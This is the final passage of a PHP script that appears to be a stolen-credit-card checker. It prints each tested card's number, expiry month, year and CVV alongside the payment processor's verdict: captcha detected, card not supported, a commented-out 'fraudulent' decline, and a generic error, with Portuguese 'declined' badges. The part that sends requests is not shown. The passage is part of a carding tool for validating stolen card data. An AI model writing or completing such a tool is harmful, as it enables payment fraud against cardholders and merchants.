  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>Captcha detected</i> </font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
///elseif(strpos($result, '"decline_code": "fraudulent"')) {
  ///echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>Fraudulent</i> </font><br>";

else {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>Server Failure/Error Not Listed</i> </font><br>";
}
curl_close($ch);
ob_flush();
///echo $result;

?>
